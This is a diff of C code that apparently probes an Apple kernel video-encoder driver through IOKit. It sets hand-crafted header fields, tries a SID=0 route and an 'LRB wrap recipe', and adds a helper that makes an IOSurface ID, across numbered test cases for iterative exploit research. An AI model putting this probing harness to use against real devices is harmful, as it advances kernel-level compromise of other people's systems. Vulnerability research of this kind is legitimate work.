@@ -58,6 +58,33 @@ static uint64_t counter = 0x0000700000004005ULL;
 static void apply_patch(uint8_t *buf, const char *spec); /* fwd: used by create_session */
 static io_service_t svc;
 
+/* v49: create a real IOSurface via dlsym'd CF (dict: 1920x1080 bpe=1); returns global ID, 0 on fail */
+static uint32_t surf_make_id(void) {
+    typedef void *(*cf_dict_mut_fn)(void *, long, const void *, const void *);
+    typedef void (*cf_setval_fn)(void *, const void *, const void *);
+    typedef void *(*cf_num_fn)(void *, long, const void *);
+    typedef void *(*iosurf_create_fn)(void *);
+    typedef uint32_t (*iosurf_id_fn)(void *);
+    cf_dict_mut_fn cdm = (cf_dict_mut_fn)dlsym(RTLD_DEFAULT, "CFDictionaryCreateMutable");
+    cf_setval_fn csv = (cf_setval_fn)dlsym(RTLD_DEFAULT, "CFDictionarySetValue");
+    cf_num_fn cnum = (cf_num_fn)dlsym(RTLD_DEFAULT, "CFNumberCreate");
+    iosurf_create_fn isc = (iosurf_create_fn)dlsym(RTLD_DEFAULT, "IOSurfaceCreate");
+    iosurf_id_fn isg = (iosurf_id_fn)dlsym(RTLD_DEFAULT, "IOSurfaceGetID");
+    const void *str_cb = dlsym(RTLD_DEFAULT, "kCFCopyStringDictionaryKeyCallBacks");
+    const void *val_cb = dlsym(RTLD_DEFAULT, "kCFTypeDictionaryValueCallBacks");
+    const void **kw = (const void **)dlsym(RTLD_DEFAULT, "kIOSurfaceWidth");
+    const void **kh = (const void **)dlsym(RTLD_DEFAULT, "kIOSurfaceHeight");
+    const void **kbpe = (const void **)dlsym(RTLD_DEFAULT, "kIOSurfaceBytesPerElement");
+    if (!cdm || !csv || !cnum || !isc || !isg || !str_cb || !val_cb || !kw || !kh || !kbpe) return 0;
+    void *dict = cdm(NULL, 0, str_cb, val_cb);
+    long long w = 1920, h = 1080, bpe = 1;
+    void *nw = cnum(NULL, 4, &w), *nh = cnum(NULL, 4, &h), *nb = cnum(NULL, 4, &bpe);
+    if (!dict || !nw || !nh || !nb) return 0;
+    csv(dict, *kw, nw); csv(dict, *kh, nh); csv(dict, *kbpe, nb);
+    void *surf = isc(dict);
+    return surf ? isg(surf) : 0;
+}
+
 static kern_return_t create_session(int mode, io_connect_t *conn) {
     *conn = MACH_PORT_NULL;
     kern_return_t kr = p_IOServiceOpen(svc, mach_task_self(), g_opentype, conn);
@@ -918,10 +945,10 @@ int main(void) {
            payload FIRST, then write header fields (v46 wrote the header first and the memcpy of the
            Prepare body overwrote +0x10..+0x28 with the version string). */
         const char *patch = getenv("AVE2_MS_PATCH");
-        printf("=== sid5 v47: Start header 0x30, per-field isolation ===\n");
-        for (int ci = 0; ci < 10; ci++) {
+        printf("=== sid6 v49: Start header 0x30, per-field isolation ===\n");
+        for (int ci = 0; ci < 14; ci++) {
             size_t lay = 0x30;
-            int copyPayload = 1; uint32_t SIDv = 1u; int64_t dc = 1, to = 0, st = 0; int lrb = 0;
+            int copyPayload = 1; uint32_t SIDv = 1u; int64_t dc = 1, to = 0, st = 0; int lrb = 0; int idx = 0;
             if (ci == 0) copyPayload = 0;                     /* header only */
             if (ci == 1) SIDv = 0u;                           /* SID=0 control */
             if (ci == 2) dc = 0;                              /* iDataCnt = 0 */
@@ -931,7 +958,13 @@ int main(void) {
             if (ci == 6) lay = 0x40;
             if (ci == 7) { copyPayload = 0; SIDv = 0x132eu; }  /* header only + real SID */
             if (ci == 8) lrb = 1;                             /* payload carries LRB wrap recipe */
-            char tag[40]; snprintf(tag, sizeof(tag), "C%d lay%zx cp%d SID%x", ci, lay, copyPayload, SIDv);
+            /* v49 sid6 additions: SID=0 passes into generic CheckParam (C1 -> -1001), so try
+               to clear -1001 on that route and probe whether a fresh real SID behaves differently. */
+            if (ci == 10) { SIDv = 0u; lrb = 1; }             /* SID=0 + LRB wrap recipe */
+            if (ci == 11) { SIDv = 0u; idx = 1; }             /* SID=0 + iUCInfoIdx=1 */
+            if (ci == 12 || ci == 13) { SIDv = surf_make_id(); if (ci == 13) idx = 1; }
+            if ((ci == 12 || ci == 13) && SIDv == 0) printf("    [C%d] surf_make_id failed\n", ci);
+            char tag[40]; snprintf(tag, sizeof(tag), "C%d lay%zx cp%d SID%x idx%d", ci, lay, copyPayload, SIDv, idx);
             if (create_session(1, &c) != 0) { printf("[-] create\n"); goto s5done; }
             { uint8_t din[0x40]; memset(din,0,sizeof(din)); memcpy(din,"904.76.7",8);
               iodyn_async_ref_t aref; memset(aref,0,sizeof(aref)); aref[0]=1;
@@ -947,7 +980,7 @@ int main(void) {
             *(int64_t  *)(d5 + 0x18) = to;
             *(int64_t  *)(d5 + 0x20) = st;
             *(uint32_t *)(d5 + 0x28) = SIDv;
-            *(int32_t  *)(d5 + 0xa0a8) = 0;
+            *(int32_t  *)(d5 + 0xa0a8) = idx;
             if (lrb) {
                 *(uint32_t *)(d5 + 0x264) = 1;
                 *(uint32_t *)(d5 + 0x26c) = 0x10000;
